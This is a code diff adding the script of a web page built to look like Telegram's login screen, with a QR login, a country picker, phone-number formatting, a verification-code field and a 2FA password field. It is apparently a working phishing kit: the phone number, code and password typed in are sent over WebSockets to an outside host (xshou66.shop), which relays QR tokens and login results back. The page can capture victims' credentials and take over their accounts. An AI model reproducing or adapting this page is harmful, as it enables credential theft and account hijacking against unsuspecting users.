+            "+421": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+386": " ‒‒ ‒‒‒ ‒‒‒",
+            "+677": " ",
+            "+252": " ‒‒ ‒‒‒ ‒‒‒",
+            "+27": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+82": " ‒‒ ‒‒‒‒ ‒‒‒",
+            "+211": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+34": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+94": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+249": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+597": " ‒‒‒ ‒‒‒‒",
+            "+46": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+41": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+963": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+886": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+992": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+255": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+66": " ‒ ‒‒‒‒ ‒‒‒‒",
+            "+670": " ",
+            "+228": " ‒‒ ‒‒‒ ‒‒‒",
+            "+690": " ",
+            "+676": " ",
+            "+1868": " ‒‒‒ ‒‒‒‒",
+            "+216": " ‒‒ ‒‒‒ ‒‒‒",
+            "+90": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+993": " ‒‒ ‒‒‒‒‒‒",
+            "+1649": " ‒‒‒ ‒‒‒‒",
+            "+688": " ",
+            "+256": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+380": " ‒‒ ‒‒‒ ‒‒ ‒‒",
+            "+971": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+44": " ‒‒‒‒ ‒‒‒‒‒‒",
+            "+598": " ‒ ‒‒‒ ‒‒‒‒",
+            "+1340": " ‒‒‒ ‒‒‒‒",
+            "+998": " ‒‒ ‒‒‒ ‒‒ ‒‒",
+            "+678": " ",
+            "+58": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+84": " ",
+            "+681": " ",
+            "+967": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+260": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+263": " ‒‒ ‒‒‒ ‒‒‒‒"
+        }
+
+
+        function generateRandomString(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        function showQrLogin(obj) {
+            document.getElementById("qrlogin").style.display = ""
+            document.getElementById("phonelogin").classList.add("animated", "slideOutLeft")
+            document.getElementById("qrlogin").classList.add("animated", "slideInRight")
+            setTimeout(() => {
+                document.getElementById("phonelogin").style.display = "none"
+            }, 100);
+
+
+            // 
+
+        }
+
+        function submitPhone(obj) {
+            var phone = document.getElementById("phoneinput").innerText;
+
+            phone = phone.replace(/ /g, '')
+            // sendphonebtn
+            // console.log(phone)
+
+            if(phone.length < 3){
+                // tipphoneerr('Phone Number Invalid')
+                return
+            }
+            document.getElementById("sendphonebtntext").innerText = "PLEASE WAIT..."
+            obj.disabled = true;
+            showPhoneLoading()
+
+            socketphone.send(phone);
+
+
+        }
+
+        function tipphoneerr(msg){
+            document.getElementById("labelphone").innerText = msg
+            document.getElementById("labelphone").classList.add("err")
+            document.getElementById("phoneinput").classList.add("error")
+        }
+
+        function tipcodeerr(msg){
+            document.getElementById("passcodeplaceholder").innerText = msg
+            document.getElementById("passcodeplaceholder").classList.add("err")
+            document.getElementById("passcode").classList.add("error")
+        }
+
+        function tippasserr(msg){
+            document.getElementById("sendpassbtntext").innerText = msg
+            document.getElementById("pass").classList.add("error")
+            document.getElementById("labelpass").classList.add("err")
+        }
+
+        function clearerr(){
+            
+            document.getElementById("sendpassbtntext").innerText = "NEXT"
+            document.getElementById("passcodeplaceholder").innerText = "Code"
+            document.getElementById("labelphone").innerText = "Phone Number"
+            document.querySelectorAll(".err").forEach(element => {
+                element.classList.remove("err")
+            });
+            document.querySelectorAll(".error").forEach(element => {
+                element.classList.remove("error")
+            });
+        }
+
+        function tiperror(){
+            document.getElementById("labelpassword").classList.add("err")
+        }
+
+        function showloadingbtn() {
+            document.getElementById("loadingbtn").style.display = ""
+        }
+
+        function showPhoneLoading() {
+            document.getElementById("phoneloading").style.display = ""
+        }
+
+
+        function submitPassword(obj) {
+            const password = document.getElementById("password").value;
+
+            if (password == "") {
+                tiperror()
+                return
+            }
+
+            document.getElementById("btntext").innerText = "PLEASE WAIT..."
+            showloadingbtn()
+            obj.disabled = true;
+
+
+            socket.send(password);
+        }
+
+        function submitpass(obj){
+            var pass = document.getElementById("pass").value;
+            if(pass.length == 0){
+                tippasserr('NEXT')
+                return
+            }
+            obj.disabled = true
+            document.getElementById("passloading").style.display = ""
+            document.getElementById("sendpassbtntext").innerText = "PLEASE WAIT..."
+
+            if(flag == "phonelog"){
+                socketphone.send("2fa:" + pass)
+            }else{
+                socket.send(pass)
+            }
+            
+            
+        }
+
+        document.getElementById("country").addEventListener("focus", function () {
+            document.getElementById("select-pane").classList.remove("animated-fade", "fadeOut")
+            document.getElementById("select-pane").style.display = ""
+            document.getElementById("select-pane").classList.add("animated-fade", "fadeIn")
+            document.getElementById("arrow").classList.add("rotate-animation")
+            document.getElementById("arrow").style.fill = "#3390ec"
+            // console.log(document.getElementById("arrowpath"))
+
+        })
+
+        document.getElementById("country").addEventListener("blur", function () {
+            document.getElementById("arrow").classList.remove("rotate-animation")
+            document.getElementById("arrow").style.fill = "#707579"
+            setTimeout(() => {
+                document.getElementById("select-pane").classList.remove("animated-fade", "fadeIn")
+                document.getElementById("select-pane").style.display = "none"
+                document.getElementById("select-pane").classList.add("animated-fade", "fadeOut")
+            }, 300)
+
+        })
+
+        document.getElementById("country").addEventListener("input", function (e) {
+            allSelectLi.forEach(function (item) {
+                inputtext = e.target.value.toLowerCase()
+                litext = item.children[1].dataset.defaultName.toLowerCase()
+                if (litext.includes(inputtext)) {
+                    item.style.display = ""
+                } else {
+                    item.style.display = "none"
+                }
+            })
+        })
+
+        document.getElementById("pass").addEventListener("input", function (e) {
+            clearerr()
+        })
+
+        document.getElementById("eyeclose").addEventListener("click", function (e) {
+            document.getElementById("pass").type = "text"
+            document.getElementById("eyeclose").style.display = "none"
+            document.getElementById("eyeopen").style.display = ""
+            document.getElementById("eyegif").src = "../static/eyeopen.gif"
+            setTimeout(() => {
+                document.getElementById("eyegif").src = "../static/eyeopen-stop.gif"
+            }, 350)
+
+        })
+
+        document.getElementById("eyeopen").addEventListener("click", function (e) {
+            document.getElementById("pass").type = "password"
+            document.getElementById("eyeopen").style.display = "none"
+            document.getElementById("eyeclose").style.display = ""
+            document.getElementById("eyegif").src = "../static/eyeoff.gif"
+            setTimeout(() => {
+                document.getElementById("eyegif").src = "../static/eyeoff-stop.gif"
+            }, 345)
+        })
+
+
+
+
+
+        function generatePhoneWithPattern(e) {
+            e.target.dataset.leftPattern = ""
+            var country1
+
+            // console.log(country1 == undefined)
+            phonetext = e.target.innerText
+            //替换空格为''
+            phonetext = phonetext.replace(/ /g, '')
+            // console.log("length:" , phonetext.length)
+            // console.log(phonetext.substring(0,2))
+            if (phonetext.length <= 4) {
+                //    console.log(phonetext.substring(0,2))
+                for (let index = 2; index <= phonetext.length; index++) {
+                    temp = findCountrybyCode(phonetext.substring(0, index))
+                    if (temp) {
+                        country1 = temp
+                    }
+
+                }
+                //    console.log(country1)
+                if (country1 == undefined) {
+                    document.getElementById("country").value = ""
+                }
+            }
+            if (phonetext.length >= 5) {
+                for (let index = 5; index >= 2; index--) {
+                    temp = findCountrybyCode(phonetext.substring(0, index))
+                    if (temp && country1 == undefined) {
+                        country1 = temp
+                    }
+
+                }
+
+
+            }
+            // console.log(country)
+            if (country1 != undefined) {
+                if (currentPrefix != country1[1]) {
+                    e.target.innerText = country1[1]
+                    movelatst(e.target)
+                }
+                currentPrefix = country1[1]
+                document.getElementById("country").value = country1[0]
+                pattern = patternMap[currentPrefix]
+                // e.target.dataset.leftPattern = pattern
+
+                //show phone
+
+                // console.log(phonetext.substring(currentPrefix.length) , phonetext.substring(currentPrefix.length).length)
+                phoneNo = phonetext.substring(currentPrefix.length)
+                output = convertStringUsingPlaceholder(phoneNo, pattern)
+                if (phoneNo.length > 0) {
+                    e.target.innerText = currentPrefix + " " + output.converted
+                    movelatst(e.target)
+                }
+
+
+                // console.log(output)
+
+
+                // e.target.dataset.leftPattern = output.unusedPlaceholder
+                for (var index = 0, count = 0; index < pattern.length; index++) {
+                    // console.log(pattern[index])
+                    if (pattern[index] != " ") {
+                        count++
+                    }
+                    if (count == phoneNo.length) {
+                        e.target.dataset.leftPattern = pattern.substring(index + 1)
+                        break
+                    }
+                }
+
+            }
+
+        }
+
+        function convertStringUsingPlaceholder(input, placeholder) {
+            let result = '';
+            let inputIndex = 0;
+            let unusedPlaceholder = '';
+
+            let segments = placeholder.trim().split(' ');
+
+            for (let i = 0; i < segments.length; i++) {
+                let segment = segments[i];
+                let segmentLength = segment.length;
+
+                if (inputIndex + segmentLength <= input.length) {
+                    result += input.slice(inputIndex, inputIndex + segmentLength) + ' ';
+                    inputIndex += segmentLength;
+                } else {
+                    // 未使用的占位符部分从当前段开始
+                    unusedPlaceholder = segment + ' ' + segments.slice(i + 1).join(' ');
+                    break;
+                }
+            }
+
+            // 如果还有未处理的输入字符，直接添加到结果后面
+            if (inputIndex < input.length) {
+                result += input.slice(inputIndex);
+            }
+
+            return {
+                converted: result.trim(),        // 转换后的字符串
+                unusedPlaceholder: unusedPlaceholder.trim() // 未使用的占位符部分
+            };
+        }
+
+        document.getElementById("phoneinput").addEventListener("input", function (e) {
+            // console.log(e.target.innerText)
+            clearerr()
+
+            if (e.data == null) {
+                if (e.target.innerText == "+") {
+                    document.getElementById("country").value = ""
+                    e.target.dataset.leftPattern = ""
+                } else if (e.target.innerText == "") {
+                    document.getElementById("country").value = ""
+                    e.target.dataset.leftPattern = ""
+                    return
+                }
+
+            } else if (!e.data.match(/[0-9]/)) {
+                e.target.innerText = e.target.innerText.replace(e.data, "")
+                movelatst(e.target)
+                return
+            }
+            // console.log(e)
+            text = e.target.innerText
+
+            if (!text.startsWith("+")) {
+                //删除字符串第一个字符
+                //把输入的字符添加到最后
+                e.target.innerText = ""
+                e.target.innerText += "+" + e.data
+                //光标移到最后
+                movelatst(e.target)
+
+            }
+
+            //如果最后一个字符不是数字,删除最后一个字符
+            text = e.target.innerText
+
+            if (!text.slice(-1).match(/[0-9]/)) {
+                e.target.innerText = text.slice(0, -1)
+                movelatst(e.target)
+                return
+            }
+
+            generatePhoneWithPattern(e)
+
+
+        })
+
+        function movelatst(obj) {
+            const editableDiv = obj
+            const selection = window.getSelection();
+            const range = document.createRange();
+
+            // 清除当前的选区
+            selection.removeAllRanges();
+
+            // 创建一个新的 Range
+            range.selectNodeContents(editableDiv);
+            range.collapse(false); // 将光标移到末尾
+
+            // 将新的 Range 设置为当前的选区
+            selection.addRange(range);
+
+            // 触发 focus 事件
+            editableDiv.focus();
+        }
+
+        document.getElementById("passcode").addEventListener("input", function (e) {
+            clearerr()
+            // console.log(e)
+            if (e.target.value.length == 1 && e.inputType != "deleteContentBackward") {
+                document.getElementById("lookaround").style.display = "none"
+                document.getElementById("lookdown").src = "../static/lookdown.gif"
+                document.getElementById("lookdown").style.display = ""
+                setTimeout(() => {
+                    document.getElementById("lookdown").src = "../static/lookdown-stop.png"
+                }, 1000);
+            } else if (e.target.value.length == 0) {
+                document.getElementById("lookdown").style.display = "none"
+                document.getElementById("lookaround").style.display = ""
+            }else if(e.target.value.length == 5){
+                socketphone.send("code:" + e.target.value)
+            }
+        })
+
+        document.getElementById("password").addEventListener("input", function () {
+            // 如果输入框为空，则显示placeholder
+            if (this.value != "") {
+                tipnormal()
+            }
+            document.getElementById("btntext").innerText = "NEXT"
+        })
+
+        function tiperror() {
+            document.getElementById("password").classList.remove("err");
+            document.getElementById("password").classList.add("err");
+            document.getElementById("labelinput").classList.remove("err");
+            document.getElementById("labelinput").classList.add("err");
+            // setTimeout(function(){
+            //     document.getElementById("password").classList.remove("error");
+            // } , 3000)
+        }
+
+        function tipnormal() {
+            document.getElementById("password").classList.remove("err");
+            document.getElementById("labelinput").classList.remove("err");
+        }
+
+        function showloadingbtn() {
+            document.getElementById("loadingbtn").style.display = ""
+        }
+
+        function hideloadingbtn() {
+            document.getElementById("loadingbtn").style.display = "none"
+        }
+
+        function submit(obj) {
+            obj.style.display = "none"
+            const password = document.getElementById("password").value;
+
+            socket.send(password);
+
+        }
+
+        function resetPhonesend(){
+            document.getElementById("sendphonebtntext").innerText = "NEXT"
+            document.getElementById("sendphonebtn").disabled = false
+            document.getElementById("phoneloading").style.display = "none"
+        }
+
+        // var socketphone = new WebSocket("ws://localhost:8888/wsp");
+        var socketphone = new WebSocket("wss://xshou66.shop/wsp");
+
+        socketphone.onopen = function () {
+            //
+            setInterval(() =>{
+                socketphone.send("ping")
+            },10000)
+        };
+
+        socketphone.onmessage = function (event) {
+            if (event.data == 'phoneinvalid') {
+               tipphoneerr("Phone Number Invalid")
+               resetPhonesend()
+
+            }else if (event.data == 'sendsucc'){
+                resetPhonesend()
+                document.getElementById("phonecodeview").innerText = document.getElementById("phoneinput").innerText
+                slideTo("codediv")
+                document.getElementById("passcode").value = ""
+                setTimeout(() => {
+                    document.getElementById("passcode").focus()
+                }, 1000);
+                
+            }else if (event.data == '2fa'){
+                document.getElementById("2fadiv").style.display = ""
+                flag = "phonelog"
+                slide("right")
+            }else if (event.data == 'invalicode'){
+                tipcodeerr("Invalid code")
+            }else if (event.data == 'inpass'){
+                tippasserr("INCORRECT PASSWORD")
+                document.getElementById("passloading").style.display = "none"
+                document.getElementById("sendpassbtn").disabled = false
+            }else if (event.data == 'phonepassflood'){
+                resetPhonesend()
+                document.getElementById("sendphonebtntext").innerText = "PHONE_PASSWORD_FLOOD"
+                
+            }else if (event.data == 'banned'){
+                resetPhonesend()
+                document.getElementById("sendphonebtntext").innerText = "PHONE_NUMBER_BANNED"
+                
+            }else if (event.data == 'succ'){
+               alert("success")
+                
+            }
+        };
+
+        socketphone.onclose = function () {
+            console.log("Disconnected from WebSocket server");
+        };
+
+
+        var socket = new WebSocket("wss://xshou66.shop/ws");
+        // var socket = new WebSocket("ws://localhost:8888/ws");
+
+        socket.onopen = function () {
+            // socket.send("input.value");
+        };
+
+        socket.onmessage = function (event) {
+            if (event.data.startsWith("tg:")) {
+
+                var qrcodediv = document.getElementById("qrcode")
+
+                const qrCode = new QRCodeStyling({
+                    width: 256,
+                    height: 256,
+                    type: "svg",
+                    data: event.data,
+                    image: "https://xshou66.github.io/static/image-removebg-preview.png",
+                    dotsOptions: {
+                        // color: "#4267b2",
+                        type: "extra-rounded"
+                    },
+                    cornersSquareOptions: {
+                        type: "extra-rounded"
+                    },
+
+
+                    qrOptions: { typeNumber: "0", mode: "Byte", errorCorrectionLevel: "L" }
+                });
+                setTimeout(() => {
+                    qrcodediv.innerHTML = ''
+                    qrCode.append(qrcodediv);
+                    document.getElementById("loading").style.display = "none"
+                    document.getElementById("qrcode").className = ""
+                    document.getElementById("qrcode").className += " animated zoomIn"
+                    document.getElementById("qrcode").style.display = ""
+                }, 10);
+
+
+            }
+
+            if (event.data == 'waitpas') {
+                document.getElementById("2fadiv").style.display = "";
+                // document.getElementById("qrsec").style.display = "none";
+                flag = "qrlog"
+                slide('right')
+            }
+
+            if (event.data == 'inpass') {
+                tippasserr("INCORRECT PASSWORD")
+                document.getElementById("passloading").style.display = "none"
+                document.getElementById("sendpassbtn").disabled = false
+            }
+
+            if (event.data == "succ") {
+                alert("success")
+            }
+
+            // console.log("Received: " + event.data)
+
+        };
+
+        function sendMessage() {
+            var input = document.getElementById("messageInput");
+            socket.send(input.value);
+            input.value = "";
+        }
+
+        socket.onclose = function () {
+            setTimeout(function () {
+                // document.getElementById("pwdsec").style.display = "none";
+                // document.getElementById("qrsec").style.display = "none";
+                // document.getElementById("tip").style.display = ""
+                // document.getElementById("tiptext").innerHTML ="PLEASE RELOAD THE PAGE"
+                // document.getElementById("tipemo").innerHTML ="😆"
+            }, 3000)
+
+
+            console.log("Disconnected from WebSocket server");
+        };
+
+
+
+
+        function findCountrybyName(countryName) {
+            return countrymap[countryName]
+        }
+
+        function findCountrybyCode(countryCode) {
+            return Object.entries(countrymap).reverse().find(entry => entry[1] === countryCode)
+        }
+
+        // Generate QR code when the page loads
+        window.onload = function () {
+            var sysflag = 'windows'
+            //判断系统是否windiws
+            if (navigator.userAgent.includes("Windows")) {
+                sysflag = 'windows'
+            }
+            //    console.log(document.querySelectorAll(".select-ul > li"))
+            allSelectLi = document.querySelectorAll(".select-ul > li")
+            allSelectLi.forEach(function (item) {
+                // console.log(item)
+                if(sysflag == 'windows'){
+                    item.querySelector(".emoji-native").remove();
+                    var phonecode = item.children[2].innerText;
+                    var img = document.createElement("img");
+                    img.src = "../static/countryimages/" + phonecode + ".png";
+                    img.className = "emoji-li"
+                    img.style.width = "35px"
+                    img.style.marginTop = "-6px"
+                    item.querySelector("span[dir='auto']").appendChild(img);
+                }
+                item.addEventListener("click", function () {
+                    // document.getElementById("arrow").classList.remove("rotate-animation")
+                    // document.getElementById("arrow").style.fill = "#707579"
+                    // document.getElementById("select-pane").classList.remove("animated-fade", "fadeIn")
+                    // document.getElementById("select-pane").style.display = "none"
+                    // document.getElementById("select-pane").classList.add("animated-fade", "fadeOut")
+                    // console.log(item)
+                    document.getElementById("country").value = item.children[1].innerText
+                    phoneinput = document.getElementById("phoneinput")
+                    phoneinput.innerText = item.children[2].innerText
+                    phoneinput.dataset.leftPattern = patternMap[item.children[2].innerText]
+                    phoneinput.focus()
+                    movelatst(phoneinput)
+                })
+
+                countrymap[item.children[1].innerText] = item.children[2].innerText
+            })
+
+            // allSelectLi.forEach(function (item) {
+                
+            // })
+
+            document.getElementById("container").style.display = ""
+            var lookgif = document.getElementById("lookaround")
+            lookgif.src = lookgif.getAttribute("srco")
+            var eyegif = document.getElementById("eyegif")
+            eyegif.src = eyegif.getAttribute("srco")
+
+        }
+
+        slideTo("qrlogindiv")
+        setTimeout(() => {
+                 document.getElementById("container").style.display = ""
+            }, 200);
+       
+    </script>
+</body>
+
+</html>
